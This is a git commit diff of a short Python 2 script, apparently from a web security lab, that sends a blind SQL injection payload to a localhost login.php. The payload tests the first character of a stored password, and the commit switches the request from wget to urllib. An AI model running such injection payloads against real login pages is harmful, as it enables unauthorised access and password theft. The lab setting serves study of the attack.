c2bc450287c8f0aec6c5b8a0aab7211f71052046
Ny4nc4t <>
2019-05-15 18:18:00 +0200

    qw

--- script.py
+++ script.py
@@ -1,13 +1,15 @@
 import subprocess
-
+import urllib
 
 request = "\"http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' --  \""
 bashCommand = "wget  -q -O - " + request 
 #bashCommand = "echo 'hello' "
-#subprocess.call(['wget','-q','-O','index.html',request])
-subprocess.call(bashCommand)
+# subprocess.call(['wget','-q','-O','index.html',request])
 #output, error = process.communicate()
 #print output
 #print error
 #print bashCommand
 
+f = urllib.urlopen(request)
+print f.geturl()
+print f.read()
